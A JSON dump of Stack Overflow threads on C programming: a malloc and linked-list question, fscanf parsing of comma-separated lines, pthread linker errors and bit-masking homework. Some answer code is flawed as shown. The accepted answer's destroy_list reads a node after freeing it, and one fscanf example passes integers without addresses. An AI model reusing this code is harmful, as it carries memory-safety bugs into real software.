that when <code>getc</code> returns <code>EOF</code>, you continually loop and add bytes to your word (because <code>EOF != &#39;\\n&#39;</code>), when actually you should exit the loop.  If this is the case, you ought to have found it immediately if you had used a debugger."}, {"owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "edited": false, "score": 0, "creation_date": 1476249041, "post_id": 39990828, "comment_id": 67260100, "body": "why can&#39;t you consider using fgets and make life easier"}, {"owner": {"reputation": 13, "user_id": 6943882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11788c875b074052649017fc288db57c?s=128&d=identicon&r=PG&f=1", "display_name": "Liji", "link": "https://stackoverflow.com/users/6943882/liji"}, "edited": false, "score": 0, "creation_date": 1476250284, "post_id": 39990828, "comment_id": 67260464, "body": "Sorry, first post. I just updated with the structure definition. The only reason I dont put the entire program in is because its big and does some other things that are working fine. But if you really need it I can update the post with the whole function. thanks!"}, {"owner": {"reputation": 13, "user_id": 6943882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11788c875b074052649017fc288db57c?s=128&d=identicon&r=PG&f=1", "display_name": "Liji", "link": "https://stackoverflow.com/users/6943882/liji"}, "edited": false, "score": 0, "creation_date": 1476250664, "post_id": 39990828, "comment_id": 67260583, "body": "Going back to what you&#39;re saying paddy. Do I need to have a realloc every time I add ch into the data array?"}], "answers": [{"tags": [], "owner": {"reputation": 17784, "user_id": 1646322, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d9fd7a75e0d8ace7bb3276476786c2c0?s=128&d=identicon&r=PG", "display_name": "Ruslan Osmanov", "link": "https://stackoverflow.com/users/1646322/ruslan-osmanov"}, "is_accepted": true, "score": 0, "last_activity_date": 1476265019, "creation_date": 1476265019, "answer_id": 39995311, "question_id": 39990828, "link": "https://stackoverflow.com/questions/39990828/trouble-with-malloc-and-linked-list/39995311#39995311", "title": "Trouble with Malloc and Linked List", "body": "<h2>Issues</h2>\n\n<ol>\n<li><p>There are <em>no checks for return values</em>. Particularly, <code>fopen</code> and <code>malloc</code>\nmay return <code>NULL</code>. If they do, you'll catch a segmentation fault error on the\nfirst attempt to access the returned value.</p></li>\n<li><p><em>Overcomplicated logic</em>. You don't need these <code>switch_num</code>, <code>test_first</code> and <code>test_first_2</code>\nvariables (see sample code below).</p></li>\n<li><p><em>No need in <code>getc</code></em> when you're reading a text file line-by-line - use\n<code>fgets</code> instead.</p></li>\n<li><p><em>Too many memory allocations</em>. You don't need more than <code>sizeof(node_t)</code> + <em>length of the line</em> bytes per line.</p></li>\n<li><p>The allocated <em>memory is not freed</em>. The dynamic memory should be freed as\nsoon as it is not needed.</p></li>\n</ol>\n\n<h2>Example using linked list</h2>\n\n<p>The following reads a text file into a linked list. Memory is allocated for\neach list item, and for each line in the file resulting in <code>n * 2</code> memory\nallocations, where <code>n</code> is the number of lines in the file.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; /* strerror, strdup */\n#include &lt;errno.h&gt;\n\ntypedef struct _node {\n  unsigned line;\n  char *data;\n  struct _node *next;\n} node_t;\n\n\nstatic void\ndestroy_list(node_t *list)\n{\n  node_t *node;\n\n  for (node = list; node; node = node-&gt;next) {\n    if (node-&gt;data != NULL)\n      free(node-&gt;data);\n    free(node);\n  }\n}\n\n\nstatic node_t *\ncreate_list_item(const char *data, unsigned line)\n{\n  node_t *node = calloc(1, sizeof(node_t));\n\n  if (node == NULL) {\n    fprintf(stderr, \"calloc: %s\\n\", strerror(errno));\n  } else {\n    node-&gt;line = line;\n    node-&gt;data = strdup(data);\n    if (node-&gt;data == NULL) {\n      fprintf(stderr, \"strdup: %s\\n\", strerror(errno));\n      free(node);\n      node = NULL;\n    }\n  }\n\n  return node;\n}\n\n\n/* Returns pointer to new linked list */\nstatic node_t *\nread_file(FILE *fp, char *buf, size_t buf_len)\n{\n  node_t *list = NULL;\n  node_t *prev = NULL;\n  node_t *node;\n  unsigned i;\n\n  for (i = 0; fgets(buf, buf_len, fp); prev = node) {\n    if ((node = create_list_item(buf, ++i)) == NULL) {\n      fprintf(stderr, \"calloc: %s\\n\", strerror(errno));\n      break;\n    }\n\n    if (list == NULL)\n      list = node;\n\n    if (prev != NULL)\n      prev-&gt;next = node;\n  }\n\n  return list;\n}\n\n\nstatic void\nprint_list(const node_t *list)\n{\n  const node_t *node;\n\n  for (node = list; node; node = node-&gt;next)\n    printf(\"%d: %s\", node-&gt;line, node-&gt;data);\n}\n\n\nint main(int argc, char const* argv[])\n{\n  const char *filename = \"text.txt\";\n  char buf[1024] = {0};\n  FILE *fp = NULL;\n  node_t *list = NULL;\n\n  if (NULL == (fp = fopen(filename, \"r\"))) {\n    fprintf(stderr, \"failed to open file %s: %s\\n\",\n        filename, strerror(errno));\n    return 1;\n  }\n\n  list = read_file(fp, buf, sizeof(buf));\n  fclose(fp);\n\n  if (list) {\n    print_list(list);\n    destroy_list(list);\n  }\n\n  return 0;\n}\n</code></pre>\n\n<h2>Example using dynamic array</h2>\n\n<p>It is inefficient to allocate memory for each line (twice) in the file,\nnot only because the system calls (<code>malloc</code>, <code>realloc</code>, etc.) are costly,\nbut also because the items are placed non-contiguously. Accessing contiguous\nregion of memory is usually faster.</p>\n\n<p>In the following code, the linked list is replaced with dynamic array. We\ninitialize memory for 10 lines at once. The size is increased as necessary.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt; /* strerror, strdup */\n#include &lt;errno.h&gt;\n\ntypedef struct _node {\n  size_t line;\n  char *data;\n} node_t;\n\n\nstatic void\ndestroy_array(node_t *array, size_t size)\n{\n  size_t i;\n  node_t *item;\n\n  for (i = 0; i &lt; size; i++) {\n    item = &amp;array[i];\n    if (item-&gt;data)\n      free(item-&gt;data);\n  }\n  free(array);\n}\n\n\nstatic void\nprint_array(node_t *array, size_t size)\n{\n  size_t i;\n  node_t *item;\n\n  for (i = 0; i &lt; size; i++) {\n    item = &amp;array[i];\n    if (item-&gt;data) {\n      printf(\"%ld: %s\", item-&gt;line, item-&gt;data);\n    }\n  }\n}\n\nstatic node_t *\nread_file(FILE *fp, char *buf, size_t buf_len,\n    const size_t array_step, size_t *array_size)\n{\n  node_t *item;\n  node_t *array = calloc(array_step, sizeof(node_t));\n  size_t size = 0;\n  if (array == NULL) {\n    fprintf(stderr, \"calloc:%s\\n\", strerror(errno));\n    return array;\n  }\n\n  while (fgets(buf, buf_len, fp)) {\n    if (size &amp;&amp; size % array_step == 0) {\n      array = realloc(array, sizeof(node_t) * (array_step + size));\n      if (array == NULL) {\n        fprintf(stderr, \"realloc:%s\\n\", strerror(errno));\n        break;\n      }\n    }\n    item = &amp;array[size++];\n\n    item-&gt;line = size;\n    item-&gt;data = strdup(buf);\n    if (item-&gt;data == NULL) {\n      fprintf(stderr, \"strdup: %s\\n\", strerror(errno));\n      break;\n    }\n  }\n\n  *array_size = size;\n\n  return array;\n}\n\nint main(int argc, char const* argv[])\n{\n  node_t *array;\n  const size_t array_step = 10;\n  size_t array_size;\n  const char *filename = \"text.txt\";\n  char buf[1024] = {0};\n  FILE *fp = NULL;\n\n  if (NULL == (fp = fopen(filename, \"r\"))) {\n    fprintf(stderr, \"failed to open file %s: %s\\n\",\n        filename, strerror(errno));\n    return 1;\n  }\n\n  array = read_file(fp, buf, sizeof(buf), array_step, &amp;array_size);\n  fclose(fp);\n\n  if (array) {\n    print_array(array, array_size);\n    destroy_array(array, array_size);\n  }\n\n  return 0;\n}\n</code></pre>\n\n<p>Note the changes in <code>node_t</code> structure.</p>\n"}], "owner": {"reputation": 13, "user_id": 6943882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11788c875b074052649017fc288db57c?s=128&d=identicon&r=PG&f=1", "display_name": "Liji", "link": "https://stackoverflow.com/users/6943882/liji"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 247, "favorite_count": 0, "accepted_answer_id": 39995311, "answer_count": 1, "score": 0, "last_activity_date": 1476265019, "creation_date": 1476248423, "last_edit_date": 1476250717, "question_id": 39990828, "link": "https://stackoverflow.com/questions/39990828/trouble-with-malloc-and-linked-list", "title": "Trouble with Malloc and Linked List", "body": "<p>I have a function that reads a text file filled with a word on every line. Here is an example of a text file I'm using</p>\n\n<pre><code>and\nbut\nfive\nfollows\nfour\nhas\nis\nlike\nline\nlines\nlittlest\nnot\nonce\none\nonly\nother\nsix\nthe\nthree\ntwice\ntwo\nword\nwords\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>typedef struct node node_t;\n\nstruct node {\n    char data[MAX_WORD];\n    int term;\n    node_t *next;\n};\n\nnode_t *head; \n\nint\nint_struct(int lines){\n    FILE *fp;\n    char ch;\n    int n = 0, i, switch_num=1, test_first=0, test_first_2=0;\n    node_t *node, *curr_add; \n    fp = fopen(\"text.txt\", \"r\");\n    node = (node_t*)malloc(sizeof(node_t));\n    for (i=1; i&lt;=lines; i++){\n        switch_num = 1;\n        n=0;\n        if (test_first != 0){\n            if (test_first_2){\n                node = (node_t*)malloc(1000000);\n            }\n            test_first_2=1;\n            while ((ch = getc(fp)) != '\\n'){\n                node -&gt; term = i;\n                node -&gt; data[n] = ch;\n                n++;\n            }\n            curr_add -&gt; next = node;\n            curr_add = node;\n        }\n        else{\n            test_first = 1;\n            head = curr_add = node;\n        }\n    }\n    curr_add -&gt; next = NULL;\n    fclose(fp);\n    return num;\n}\n</code></pre>\n\n<p>What I want to do is to read each word and add it to a linked list.<br>\nHowever I am having trouble with malloc (at the moment I just add in a lot of bytes) and need advice on how to properly use it inside the function I have. I've done a general search and tried my best to try and do what most examples do. But I still can't seem to get my function working. For example, every time I execute the program it will read and add all the words into the linked list. However, the program crashes on the last word, and returns NULL. If anyone is able to point me in the right direction, I'd be very grateful.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 2847, "user_id": 382588, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/f52bc4ad81523f13d2275097f925a367?s=128&d=identicon&r=PG", "display_name": "Asaf", "link": "https://stackoverflow.com/users/382588/asaf"}, "edited": false, "score": 0, "creation_date": 1476247751, "post_id": 39990671, "comment_id": 67259726, "body": "there are many o line tools to check regular expresions: <a href=\"http://www.freeformatter.com/regex-tester.html\" rel=\"nofollow noreferrer\">freeformatter.com/regex-tester.html</a>"}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "reply_to_user": {"reputation": 2847, "user_id": 382588, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/f52bc4ad81523f13d2275097f925a367?s=128&d=identicon&r=PG", "display_name": "Asaf", "link": "https://stackoverflow.com/users/382588/asaf"}, "edited": false, "score": 2, "creation_date": 1476247945, "post_id": 39990671, "comment_id": 67259786, "body": "@Asaf <code>scanf</code> doesn&#39;t use regular expressions."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1476248027, "post_id": 39990671, "comment_id": 67259818, "body": "You&#39;re probably better off reading an entire line with <code>fgets</code> (or <code>getline</code> if available) and tokenizing it with <code>strtok</code>. <code>scanf</code> (and <code>fscanf</code>) are notoriously hard to use correctly."}, {"owner": {"reputation": 292, "user_id": 1807662, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9sfYi.jpg?s=128&g=1", "display_name": "TimelordViktorious", "link": "https://stackoverflow.com/users/1807662/timelordviktorious"}, "edited": false, "score": 0, "creation_date": 1476248262, "post_id": 39990671, "comment_id": 67259875, "body": "I must use fscanf or scanf for this sadly!"}, {"owner": {"reputation": 2847, "user_id": 382588, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/f52bc4ad81523f13d2275097f925a367?s=128&d=identicon&r=PG", "display_name": "Asaf", "link": "https://stackoverflow.com/users/382588/asaf"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1476248464, "post_id": 39990671, "comment_id": 67259935, "body": "@jamesdli... i ignored the scanf part. maybe he should store the results of the scan f in an array and just then test if a string pass his regular expression test... but it seems that something is wrong with the regular expression"}], "answers": [{"comments": [{"owner": {"reputation": 292, "user_id": 1807662, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9sfYi.jpg?s=128&g=1", "display_name": "TimelordViktorious", "link": "https://stackoverflow.com/users/1807662/timelordviktorious"}, "edited": false, "score": 0, "creation_date": 1476248203, "post_id": 39990758, "comment_id": 67259859, "body": "Without loss of generalization z is actually a string, it is a string of both words and numbers."}, {"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "reply_to_user": {"reputation": 292, "user_id": 1807662, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9sfYi.jpg?s=128&g=1", "display_name": "TimelordViktorious", "link": "https://stackoverflow.com/users/1807662/timelordviktorious"}, "edited": false, "score": 0, "creation_date": 1476249645, "post_id": 39990758, "comment_id": 67260280, "body": "In that case, you can use <code>fscanf(infile, &quot;%d,%d,%s&quot;, x, y, z_str);</code> to read a line of the file. <code>z_str</code> is a string and is directly read."}], "tags": [], "owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "is_accepted": false, "score": 1, "last_activity_date": 1476249705, "last_edit_date": 1476249705, "creation_date": 1476248035, "answer_id": 39990758, "question_id": 39990671, "link": "https://stackoverflow.com/questions/39990671/reading-in-a-text-file-with-commas/39990758#39990758", "title": "Reading in a text file with comma&#39;s", "body": "<p>You are using '%s' which will read an entire word upto spaces. So <code>1,2,3</code> is read in <code>x</code> for the first line.</p>\n\n<p>What you need to do is take <code>x</code>, <code>y</code> and <code>z</code> as integers, Then you can read three integers and convert it to a string using a variety of methods (e.g. <code>itoa</code></p>\n\n<pre><code>int x,y,z;\nchar x_str[20], y_str[20], z_str[20];\n//...\nfscanf(infile, \"%d,%d,%d\", x, y, z);\nitoa{x,x_str,10);  // and so on\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1476250412, "post_id": 39990942, "comment_id": 67260506, "body": "If it&#39;s in the format of the OP (x,y,z\\n), you&#39;d want something like <code>&quot;%[^,],%[^,],%[^\\n] &quot;</code>, perhaps with spaces after the commas. Which I guess just makes your point :)"}], "tags": [], "owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "is_accepted": false, "score": 0, "last_activity_date": 1480912365, "last_edit_date": 1480912365, "creation_date": 1476249221, "answer_id": 39990942, "question_id": 39990671, "link": "https://stackoverflow.com/questions/39990671/reading-in-a-text-file-with-commas/39990942#39990942", "title": "Reading in a text file with comma&#39;s", "body": "<p>If you <em>must</em> use <code>scanf</code>/<code>fscanf</code>, then you want to use <code>%[^,]</code> as the input formatter instead of <code>%s</code>. <code>%s</code> will greedily read as much as it can; <code>%[^,]</code> will read a string consisting of characters (including whitespace) that are not <code>,</code>:</p>\n\n<pre><code>fscanf(infile, \"%[^,],%[^,],%[^,]\", x, y, z);\n</code></pre>\n\n<p>Do note that the above usage of <code>fscanf</code> is <em>unsafe</em> because it does nothing to limit the number of characters read into each string.  Consequently, it is completely susceptible to buffer-overflow attacks.</p>\n\n<hr>\n\n<p>Personally, I would read the entire line with <code>fgets</code> (or <code>getline</code> if available) and then tokenize it on <code>,</code> with <code>strtok</code>. <a href=\"http://www.c-faq.com/stdio/scanfprobs.html\" rel=\"nofollow noreferrer\"><code>scanf</code>/<code>fscanf</code> are notoriously hard to use correctly</a> and usually should be avoided.</p>\n"}], "owner": {"reputation": 292, "user_id": 1807662, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/9sfYi.jpg?s=128&g=1", "display_name": "TimelordViktorious", "link": "https://stackoverflow.com/users/1807662/timelordviktorious"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1480912365, "creation_date": 1476247451, "question_id": 39990671, "link": "https://stackoverflow.com/questions/39990671/reading-in-a-text-file-with-commas", "title": "Reading in a text file with comma&#39;s", "body": "<p>I am trying to use fscanf to read in from infile (which is either stdin or a file) for a file that is represented like this:</p>\n\n<pre><code>1,2,3\n4,5,6\n</code></pre>\n\n<p>Do ignore the fact that they are numbers - I am representing them as strings.</p>\n\n<p>What I did was I used</p>\n\n<pre><code>fscanf(infile, \"%s%*c %s%*c %s%*c[^\\n]\", x, y, z); where x, y, z are string variables. \n</code></pre>\n\n<p>I am expecting that each represent digit, on that line, gets stored in x, y, z, but it is not working, and is instead storing the entire line in x alone. </p>\n\n<p>Any help please? Thanks.</p>\n"}, {"tags": ["c", "multithreading", "pthreads"], "comments": [{"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1476247211, "post_id": 39990598, "comment_id": 67259596, "body": "You may need to use <code>-pthread</code> option while compiling and linking."}, {"owner": {"reputation": 27, "user_id": 4234493, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1184786482/picture?type=large", "display_name": "Patrick Weiss", "link": "https://stackoverflow.com/users/4234493/patrick-weiss"}, "reply_to_user": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1476247976, "post_id": 39990598, "comment_id": 67263544, "body": "Things that I&#39;ve tried: makefile all: gcc -Wall -O3 -pedantic-errors -D_REENTRANT -lpthread assn3.c -o assn3 all: gcc -g -Wall -pthread assn3.c assn3"}], "answers": [{"comments": [{"owner": {"reputation": 27, "user_id": 4234493, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1184786482/picture?type=large", "display_name": "Patrick Weiss", "link": "https://stackoverflow.com/users/4234493/patrick-weiss"}, "edited": false, "score": 0, "creation_date": 1476247753, "post_id": 39990632, "comment_id": 67259727, "body": "makefile: &#39;all:    gcc -Wall -O3 -pedantic-errors -D_REENTRANT  -lpthread  assn3.c   -o assn3&#39;"}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "edited": false, "score": 0, "creation_date": 1476249235, "post_id": 39990632, "comment_id": 67260156, "body": "Recommended to use <code>-pthread</code> instead of <code>-lpthread</code>.  This will also define <code>_REENTRANT</code> for you, and anything else necessary for threading.  It is more portable."}], "tags": [], "owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "is_accepted": false, "score": 1, "last_activity_date": 1476247192, "creation_date": 1476247192, "answer_id": 39990632, "question_id": 39990598, "link": "https://stackoverflow.com/questions/39990598/cannot-compile-multi-threading-example-in-c/39990632#39990632", "title": "Cannot compile multi-threading example in C", "body": "<p>It appears you haven't specified to the linker about thread library. For multithreading applications, the usual option for <code>gcc</code> is follows (assume your program file name thread1.c):</p>\n\n<pre><code>gcc -D_REENTRANT  -lpthread  thread1.c   -o thread1\n</code></pre>\n\n<p>It's also recommended to use <code>-Wall -O3 -pedantic-errors</code> to be <em>pedantic</em> about compiler warnings etc. So this should do:</p>\n\n<pre><code>gcc -Wall -O3 -pedantic-errors -D_REENTRANT  -lpthread  thread1.c   -o thread1\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 4234493, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1184786482/picture?type=large", "display_name": "Patrick Weiss", "link": "https://stackoverflow.com/users/4234493/patrick-weiss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 198, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1476251086, "creation_date": 1476246913, "last_edit_date": 1476251086, "question_id": 39990598, "link": "https://stackoverflow.com/questions/39990598/cannot-compile-multi-threading-example-in-c", "title": "Cannot compile multi-threading example in C", "body": "<h3>Having a Major issue with trying to do a multi-threading project for school</h3>\n\n<p>I'm just trying to run sample code to see how pthreads work</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include &lt;pthread.h&gt;\n int sum;\n void *runner(void *param);\n int main(int argc, char *argv[]) {     \n     pthread_t tid;\n     pthread_attr_t attr;\n\n     if (argc !=2){\n         fprintf(stderr, \"usage: a.out &lt;interger value&gt;\\n\");\n         return -1;\n     }\n     if (atoi(argv[1]) &lt; 0) {\n         fprintf(stderr, \"%d must be &gt;= 0\\n\",atoi(argv[1]));\n         return -1;\n     }\n     pthread_attr_init(&amp;attr);//get default attributes\n     pthread_create(&amp;tid,&amp;attr,runner,argv[1]);//create the thread\n     pthread_join(tid,NULL);//wait for the thread to exit\n     printf(\"sum = %d\\n\",sum);\n }\n\n void *runner(void *param) {\n     int i, upper = atoi(param);\n     sum = 0;\n     for (i =1; i &lt;= upper; i++) {\n         sum += i;\n     } \n     pthread_exit(0);\n }\n</code></pre>\n\n<p>And no matter what I do I can't get the code to compile. I get the following error:</p>\n\n<blockquote>\n  <p>Running \"/home/ubuntu/workspace/primefactor/assn3.c\"\n   /tmp/cc58AE5c.o: In function 'main':\n   assn3.c:(.text+0xc4): undefined reference to 'pthread_create'\n   assn3.c:(.text+0xd5): undefined reference to 'pthread_join'\n   collect2: error: ld returned 1 exit status\n   Process exited with code: 1</p>\n</blockquote>\n\n<p>I've tried writing my own makefile with the -pthread flag; didn't work....\nI've tried running</p>\n\n<blockquote>\n  <p>sudo apt-get install libpthread-stubs0-dev</p>\n</blockquote>\n\n<p>to install the right library; didn't work...</p>\n\n<p>I'm at my wits end to try and get pthreads_create() and pthreads_join() to work and they're the main requirement for my school project. I've already gotten the project working with a normal C program (take numbers from the command line, get the prime factors for each arg, store them in an array, then pass that array and display the results. ex: ./prime.c.o {1..100} would be run from BASH and it outs 1:1 2: 2 3: 3 4: 2 2 etc...\nso that's what the output is supposed to be and I'm supposed to do that with threading, but I can't do that if I can't even compile sample code to see how threads work. </p>\n\n<p>I really have already spent several hours searching, trying, but no luck getting rid of these undefined reference errors for pthread_create() and pthread_join() . Any help would be greatly appreciated in figuring out why I get the above errors.</p>\n\n<p>Edit:</p>\n\n<p>Thanks to those that tried answering for me.  I don't know why I got the down vote; I'm not very active here and I do try to be polite when asking for help. Anyways I finally figured it out.</p>\n\n<p>If I am using the make file it had to look like this:</p>\n\n<pre><code>assn3:\n    gcc -g -Wall -pthread assn3.c -o assn3\n</code></pre>\n\n<p>Then from the command line: <code>make assn3</code></p>\n"}, {"tags": ["c", "bit-manipulation", "bitwise-operators", "boolean-logic"], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 6946332, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xZ8ln.jpg?s=128&g=1", "display_name": "sgoldburg", "link": "https://stackoverflow.com/users/6946332/sgoldburg"}, "edited": false, "score": 0, "creation_date": 1476247441, "post_id": 39990508, "comment_id": 67259657, "body": "Thank You. Unfortunately I can&#39;t change <code>int bitRepeat(int x, int n)</code> or use loops/conditionals. Would storing <code>x</code> in an <code>unsigned</code> container help?"}], "tags": [], "owner": {"reputation": 6013, "user_id": 3310281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9b8b4ec03e2c7a424fdc428eb55f2e8?s=128&d=identicon&r=PG&f=1", "display_name": "Malcolm McLean", "link": "https://stackoverflow.com/users/3310281/malcolm-mclean"}, "is_accepted": false, "score": 0, "last_activity_date": 1476249650, "last_edit_date": 1476249650, "creation_date": 1476246279, "answer_id": 39990508, "question_id": 39990412, "link": "https://stackoverflow.com/questions/39990412/optimize-boolean-mask-assignment/39990508#39990508", "title": "Optimize Boolean Mask Assignment", "body": "<p>You can do it a lot easier (we want to fill an integer with n repeats of a bit pattern).</p>\n\n<pre><code>unsigned int bitRepeat(unsigned int x, int n)\n{\n   unsigned int answer = 0;\n\n   while(x)\n   {\n     answer |= x;\n     x &lt;&lt;= n;\n   }\n\n   return answer;\n}\n</code></pre>\n\n<p>You need to use unsigned integers because shifting out the MSB of a signed integer can have unpredictable consequences. (Because the compiler might\noptimise to x *= poweroftwo, and have arithmetical overflow traps set).</p>\n\n<p>Since you can't use loops, it becomes a bit more difficult. As you\nobserved, if integers are 32 bits, then worst case is we double the\nbuffer five times.</p>\n\n<p>so</p>\n\n<pre><code>int bitRepeat(int x, int n)\n{\n   unsigned int rack = x;\n\n   rack = (rack &lt;&lt; n) | rack;\n   n *= 2;\n   rack = (rack &lt;&lt; n) | rack;\n   n *= 2;\n   rack = (rack &lt;&lt; n) | rack;\n   n *= 2; \n   rack = (rack &lt;&lt; n) | rack;\n   n *= 2;\n   rack = (rack &lt;&lt; n) | rack;\n\n   return rack;\n}\n</code></pre>\n\n<p>Unfortunately this is technically undefined behaviour if the shift goes\nabove the size of an integer. Your compiler might well accept it. But it's hard to suppress without a conditional.</p>\n"}], "owner": {"reputation": 31, "user_id": 6946332, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xZ8ln.jpg?s=128&g=1", "display_name": "sgoldburg", "link": "https://stackoverflow.com/users/6946332/sgoldburg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 799, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476255164, "creation_date": 1476245603, "last_edit_date": 1495540113, "question_id": 39990412, "link": "https://stackoverflow.com/questions/39990412/optimize-boolean-mask-assignment", "title": "Optimize Boolean Mask Assignment", "body": "<p>This question is similar in nature to: <a href=\"https://stackoverflow.com/questions/13907111/is-condition-a-correct-way-to-obtain-a-full-bitvector-from-a-boolean-mask-b\">Is -!(condition) a correct way to obtain a full-bitvector from a boolean (mask-boolean)?</a></p>\n\n<p>As part of a HW solution, I would like to implement a conditional check and subsequent assignment of all \"1\" or \"0\" bits to a 32bit int.</p>\n\n<p><strong>My code is : <code>value &amp; ~(!(x &amp; y) - 1)</code>. If there is some overlap between x's and y's bits, value is set to 0, otherwise value is left alone.</strong></p>\n\n<p><strong>My question is how to optimize this statement to reduce the number of operators involved.</strong> Is this possible using only unary and binary integer operations <code>! ~ &amp; ^ | + - * / % &lt;&lt; &gt;&gt;</code> ?</p>\n\n<p>Here is my code for some reference, it repeats the low-order n bits of x to word length:</p>\n\n<pre><code>int bitRepeat(int x, int n) {\n/* Mask desired bits, shift and OR by larger intervals each time, return repeated pattern */    \n\n/* Check for n = 32, set a to all 1's if n != 32 */ \nint nMax = ~(!(n &amp; 31)-1);  \n\n/* Mask low-order n bits */\nint maskBits = ~(~0 &lt;&lt; n) &amp; x;  \n\n/* Initialize shift factors */  \nint n2 = n * 2; \nint n4 = n * 4; \nint n8 = n * 8; \nint n16 = n * 16;\n\n/* Shift and OR masked bits by intervals n * x {x: 1,2,4,8,16}, check for overflow at each step */  \nint overFlowMask = ~0 &lt;&lt; 5;\nmaskBits = maskBits | maskBits &lt;&lt; n;\nmaskBits = maskBits | ((maskBits &lt;&lt; (n2)) &amp; ~(!((n2) &amp; overFlowMask) - 1));\nmaskBits = maskBits | ((maskBits &lt;&lt; (n4)) &amp; ~(!((n4) &amp; overFlowMask) - 1));\nmaskBits = maskBits | ((maskBits &lt;&lt; (n8)) &amp; 